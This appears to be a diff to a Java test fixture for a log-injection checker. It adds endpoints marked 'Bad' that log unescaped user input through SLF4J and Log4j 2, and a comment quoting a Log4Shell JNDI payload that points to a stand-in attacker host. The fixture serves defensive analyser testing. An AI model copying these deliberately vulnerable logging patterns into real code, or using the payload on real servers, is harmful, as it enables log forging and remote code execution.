@@ -25,6 +25,12 @@ public class LogInjection {
 
   private static final Logger LOGGER = Logger.getLogger(LogInjection.class.getName());
 
+  private static final org.slf4j.Logger SLF4J_LOGGER =
+      org.slf4j.LoggerFactory.getLogger(LogInjection.class);
+
+  private static final org.apache.logging.log4j.Logger LOG4J_LOGGER =
+      org.apache.logging.log4j.LogManager.getLogger(LogInjection.class);
+
   @POST
   @Path("/login")
   void failedLoginBad(@FormParam("user") String user) {
@@ -56,6 +62,42 @@ public class LogInjection {
     LOGGER.info("session " + id + " resumed");
   }
 
+  // SLF4J: the arguments are formatted into the message, without escaping
+
+  @POST
+  @Path("/v5/login")
+  void failedLoginWithSlf4jBad(@FormParam("user") String user) {
+    SLF4J_LOGGER.warn("login failed for {}", user);
+  }
+
+  @POST
+  @Path("/v5/reset")
+  void passwordResetWithSlf4jBad(@FormParam("email") String email) {
+    SLF4J_LOGGER.info("password reset requested for " + email);
+  }
+
+  @POST
+  @Path("/v5/lock")
+  void lockAccountWithSlf4jBad(@FormParam("user") String user, @FormParam("reason") String reason) {
+    SLF4J_LOGGER.error("account {} locked: {}", user, reason);
+  }
+
+  // Log4j 2
+
+  @POST
+  @Path("/v6/login")
+  void failedLoginWithLog4jBad(@FormParam("user") String user) {
+    LOG4J_LOGGER.warn("login failed for {}", user);
+  }
+
+  // Before 2.15, Log4j 2 also resolved lookups such as "${jndi:ldap://attacker.example/a}" in the
+  // message, which let the client run code on the server (Log4Shell).
+  @GET
+  @Path("/v6/sessions/{id}")
+  void unknownSessionWithLog4jBad(@PathParam("id") String id) {
+    LOG4J_LOGGER.error("unknown session " + id);
+  }
+
   // interprocedural
 
   private static void audit(String event) {
@@ -80,6 +122,13 @@ public class LogInjection {
   @Path("/v2/login")
   void failedLoginOk(@FormParam("user") String user) {
     LOGGER.warning("login failed");
+  }
+
+  @POST
+  @Path("/v7/login")
+  void failedLoginWithLibrariesOk(@FormParam("user") String user) {
+    SLF4J_LOGGER.info("login failed");
+    LOG4J_LOGGER.info("login failed");
   }
 
   // a UUID only contains hexadecimal digits and dashes
